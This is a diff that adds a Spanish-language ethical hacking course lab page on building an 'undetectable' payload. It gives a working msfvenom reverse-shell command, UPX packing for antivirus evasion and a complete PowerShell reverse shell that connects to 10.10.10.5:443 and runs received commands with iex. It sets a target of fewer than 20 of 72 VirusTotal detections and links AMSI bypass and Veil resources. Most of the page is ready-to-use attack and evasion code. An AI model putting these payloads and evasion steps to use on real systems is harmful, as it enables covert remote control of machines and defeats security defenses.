@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Laboratorio Unidad 6 - Ethical Hacking 2026</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+        h1 { color: #2c3e50; }
+        a { color: #3498db; }
+    </style>
+</head>
+<body>
+    <h1>Laboratorio Unidad 6</h1>
+    <p><a href="../index.html">← Volver al índice</a></p>
+    <hr>
+    <div class="content">
+# Lab 6: Desarrollo de Payload Indetectable
+
+## Objetivo
+
+Generar un payload, aplicarle técnicas de ofuscación y verificar su detectabilidad.
+
+## Prerrequisitos
+
+- Kali Linux
+- Cuenta en VirusTotal (API key gratuita)
+
+## Entorno
+
+```bash
+# Instalar herramientas
+pip install requests
+apt install msfvenom upx-x86 -y
+```
+
+## Escenario
+
+Desarrolla un payload de reverse shell que evada la detección de antivirus básicos.
+
+## Pasos
+
+### Paso 1: Generar Payload Base
+
+```bash
+# Payload básico
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=443 -f elf -o shell_basic.elf
+
+# Verificar con VirusTotal (usar API)
+# Documentar detecciones: X/70
+```
+
+### Paso 2: Ofuscación con UPX
+
+```bash
+# Comprimir con UPX
+upx -9 -o shell_packed.elf shell_basic.elf
+
+# Verificar detección
+```
+
+### Paso 3: Ofuscación PowerShell
+
+```powershell
+# Script de reverse shell ofuscado
+$client = New-Object System.Net.Sockets.TCPClient("10.10.10.5",443)
+$stream = $client.GetStream()
+[byte[]]$buf = 0..65535|%{0}
+while($data = $stream.Read($buf, 0, $buf.Length)) {
+    $sendback = (iex $data 2>&1 | Out-String )
+    $sendbuf = [Text.Encoding]::UTF8.GetBytes($sendback)
+    $stream.Write($sendbuf, 0, $sendbuf.Length)
+}
+$client.Close()
+```
+
+### Paso 4: Comparativa
+
+| Payload | Tamaño | Detección VT | Notas |
+|---------|--------|--------------|-------|
+| Basic | | | |
+| UPX | | | |
+| Ofuscado | | | |
+
+## Entregable
+
+**Archivo**: `payload_analysis.md`
+
+Incluir:
+- Screenshots de VirusTotal
+- Comparativa de detectabilidad
+- Recomendaciones para reducir detección
+
+## Resultado Esperado
+
+Al completar el lab, el estudiante debe haber medido cuantitativamente la efectividad de las técnicas de evasión:
+
+1. **Tabla comparativa completa**: Los 3 payloads enviados a VirusTotal con resultados numéricos reales (ej. `Basic: 42/72`, `UPX: 31/72`, `Ofuscado: 18/72`).
+2. **Reverse shell funcional**: Captura del listener `nc -lvnp 443` recibiendo la conexión del payload generado, mostrando prompt de shell interactiva.
+3. **AMSI bypass documentado** (si aplica Windows): Output de PowerShell mostrando que `amsiInitFailed` fue activado antes de ejecutar el script.
+4. **Reducción de detección**: Al menos una técnica que reduzca la detección en ≥15 motores AV respecto al payload base.
+
+**Flag de completitud**: Screenshot de VirusTotal con el payload final mostrando menos de 20/72 detecciones, o justificación técnica si no se logró.
+
+## Recursos
+
+- [msfvenom Cheat Sheet](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
+- [AMSI Bypass Techniques - S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+- [Veil Framework Documentation](https://github.com/Veil-Framework/Veil)
+- [MITRE ATT&CK: T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
+- [VirusTotal API Documentation](https://developers.virustotal.com/reference/overview)
+- [UPX: Ultimate Packer for eXecutables](https://upx.github.io/)
+    </div>
+</body>
+</html>
